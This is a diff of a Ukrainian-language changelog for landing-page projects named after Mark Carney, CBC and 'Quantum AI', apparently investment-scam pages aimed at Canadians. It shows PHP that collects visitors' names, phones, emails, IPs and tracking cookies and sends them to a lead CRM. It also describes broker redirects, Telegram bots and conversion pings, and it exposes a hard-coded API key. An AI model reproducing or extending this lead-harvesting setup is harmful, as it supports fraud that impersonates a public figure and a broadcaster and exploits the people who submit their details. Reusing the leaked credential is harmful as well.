@@ -53,23 +53,98 @@ https://yourdomain.com/?pixel=259649732845621&aw=AW-987654321/TestConv&camp_id=5
 ### 🎯 **ПРОЄКТИ ЩО ОНОВЛЕНО:**
 
 #### 1. **ЕТАЛОННИЙ ПРОЄКТ** - `ca-carney-cbc-magnumator-goverment` ✅
-#### 2. **ПРОЄКТИ @TRFG:**
-- ✅ `ca-mark-carney-new-cbc-magnumator-video` **[ОПТИМІЗОВАНО ГРУДЕНЬ 2024]**
-- ✅ `ca-mark-carney-new-cbc-magnumator` **[ОПТИМІЗОВАНО ГРУДЕНЬ 2024]**
-- ✅ `ca-quantum-ai-cbc-2` **[ОПТИМІЗОВАНО ГРУДЕНЬ 2024]**
-- ✅ `ca-quantumai-cbc` **[ОПТИМІЗОВАНО ГРУДЕНЬ 2024]**
+#### 2. **ПРОЄКТИ TB:**
+- ✅ `ca-mark-carney-new-cbc-magnumator-video` **[ОНОВЛЕНО СІЧЕНЬ 2025]**
+- ✅ `ca-mark-carney-new-cbc-magnumator` **[ОНОВЛЕНО СІЧЕНЬ 2025]**
+- ✅ `ca-quantum-ai-cbc-2` **[ОНОВЛЕНО СІЧЕНЬ 2025]**
+- ✅ `ca-quantumai-cbc` **[ОНОВЛЕНО СІЧЕНЬ 2025]**
 
 ---
 
-## 🔄 1. ОНОВЛЕННЯ API.PHP У ВСІХ ПРОЄКТАХ
+## 🔄 1. КРИТИЧНЕ ОНОВЛЕННЯ CRM API - СІЧЕНЬ 2025
 
-### ✅ **Уніфіковані зміни:**
-- **API Endpoint:** `https://crm.traffic-g.live/api/leads` (для всіх проєктів)
-- **POST поля:** Стандартизовано для всіх проєктів
+### 🚨 **МІГРАЦІЯ НА НОВИЙ API ENDPOINT:**
+- **СТАРИЙ API:** `https://crm.traffic-g.live/api/leads` ❌ (ВІДКЛЮЧЕНО)
+- **НОВИЙ API:** `https://slm.api.vibero.tech/clients/lead` ✅ (АКТИВНИЙ)
+- **НОВА АВТЕНТИФІКАЦІЯ:** `x-api-key: Og00Z1h-skZfY4IY-GMxzH73NjX6AwQZ`
+- **НОВИЙ ФОРМАТ:** JSON замість form-data
+
+### ✅ **Оновлена структура даних:**
+```php
+// Спочатку визначаємо змінні
+$name = $_POST["name"];
+$last = $_POST["lastname"];
+$phone = $_POST["phone"];
+$email = $_POST["email"];
+$summ = "CA";
+$ip = getIp();
+$comment = $_POST['answer'] ?? '';
+$get = $_POST['get'] ?? '';
+$messageT = $_POST['phonecc'] ?? '';
+$nameOffer = 'Magnumator'; // або 'QuantumAI' залежно від проекту
+$domain = $_SERVER['HTTP_REFERER'] ?? '';
+$fbPixel = $_COOKIE['pixel'] ?? '';
+$subid = $_POST['subid'] ?? '';
+
+// Потім використовуємо змінні в масиві (ОПТИМІЗОВАНО!)
+$data = array(
+    "firstName" => $name,
+    "lastName" => $last,
+    "email" => $email,
+    "phone" => $phone,
+    "country" => $summ,
+    "lang" => "EN",
+    "marker" => isset($_GET['marker']) ? $_GET['marker'] : "",
+    "offer" => $nameOffer, // використовуємо змінну замість константи
+    "domain" => $domain,
+    "ip" => $ip,
+    "sub_id_1" => isset($_GET['sub_id_1']) ? $_GET['sub_id_1'] : "",
+    "sub_id_2" => isset($_GET['sub_id_2']) ? $_GET['sub_id_2'] : "",
+    "sub_id_3" => isset($_GET['sub_id_3']) ? $_GET['sub_id_3'] : $_SERVER['HTTP_USER_AGENT'],
+    "sub_id_4" => isset($_GET['sub_id_4']) ? $_GET['sub_id_4'] : (isset($_SERVER['HTTP_REFERER']) ? parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) : ""),
+    "utm_medium" => isset($_GET['utm_medium']) ? $_GET['utm_medium'] : "",
+    "utm_content" => isset($_GET['utm_content']) ? $_GET['utm_content'] : "",
+    "utm_campaign" => isset($_GET['utm_campaign']) ? $_GET['utm_campaign'] : "",
+    "utm_source" => isset($_GET['utm_source']) ? $_GET['utm_source'] : "",
+    "utm_term" => isset($_GET['utm_term']) ? $_GET['utm_term'] : ""
+);
+```
+
+### ✅ **Нова cURL конфігурація:**
+```php
+curl_setopt_array($curl, array(
+    CURLOPT_URL => 'https://slm.api.vibero.tech/clients/lead',
+    CURLOPT_POSTFIELDS => json_encode($data), // JSON формат
+    CURLOPT_HTTPHEADER => array(
+        'x-api-key: Og00Z1h-skZfY4IY-GMxzH73NjX6AwQZ',
+        'Content-Type: application/json'
+    ),
+    CURLOPT_TIMEOUT => 3,              // Збережено оптимізацію
+    CURLOPT_CONNECTTIMEOUT => 2,       // Збережено оптимізацію
+    // ... інші опції
+));
+```
+
+### ✅ **Покращене логування:**
+- `log_submit_data2.txt` - дані що відправляються
+- `log_submit_data.txt` - відповіді API
+- `log_submit_data_leads.txt` - табульований формат лідів
+
+### ✅ **Конверсійний трекінг:**
+```php
+// Автоматичний трекінг конверсій
+if (!empty($subid)) {
+    file_get_contents('https://investhorizon.biz/click?cnv_id=' . urlencode($subid) . '&payout=0&cnv_status=lead');
+}
+```
+
+## 🔄 2. ПОПЕРЕДНІ ОНОВЛЕННЯ API.PHP У ВСІХ ПРОЄКТАХ
+
+### ✅ **Уніфіковані зміни (Грудень 2024):**
 - **Telegram інтеграція:** Два бота з валідними токенами
 - **Автоматичний редирект:** Додано логіку broker redirect
-- **⚡ ПРОДУКТИВНІСТЬ:** Додано cURL таймаути (10s timeout, 5s connect timeout)
-- **🚀 TELEGRAM ОПТИМІЗАЦІЯ:** Асинхронні запити з curl_multi замість послідовних
+- **⚡ ПРОДУКТИВНІСТЬ:** Додано cURL таймаути (3s timeout, 2s connect timeout)
+- **🚀 TELEGRAM ОПТИМІЗАЦІЯ:** Швидкі запити з 1s таймаутом
 - **🛡️ БЕЗПЕКА:** URL валідація з filter_var() в thanks.php
 
 ### 📊 **Структура POST даних:**
@@ -82,12 +157,17 @@ $summ = "CA";                    // Країна (Канада)
 $nameOffer = 'Magnumator';       // Назва офера (або QuantumAI для quantum проєктів)
 ```
 
-### ⚡ **Оптимізація cURL (Грудень 2024):**
+### ⚡ **Оптимізація cURL (Оновлено Січень 2025):**
 ```php
 curl_setopt_array($curl, array(
-    CURLOPT_URL => 'https://crm.traffic-g.live/api/leads',
-    CURLOPT_TIMEOUT => 10,           // Максимальний час виконання
-    CURLOPT_CONNECTTIMEOUT => 5,     // Час підключення
+    CURLOPT_URL => 'https://slm.api.vibero.tech/clients/lead', // НОВИЙ ENDPOINT
+    CURLOPT_POSTFIELDS => json_encode($data),                  // JSON замість form-data
+    CURLOPT_HTTPHEADER => array(
+        'x-api-key: Og00Z1h-skZfY4IY-GMxzH73NjX6AwQZ',       // НОВИЙ API KEY
+        'Content-Type: application/json'                       // JSON Content-Type
+    ),
+    CURLOPT_TIMEOUT => 3,            // Оптимізований час виконання
+    CURLOPT_CONNECTTIMEOUT => 2,     // Оптимізований час підключення
     // ... інші опції
 ));
 ```
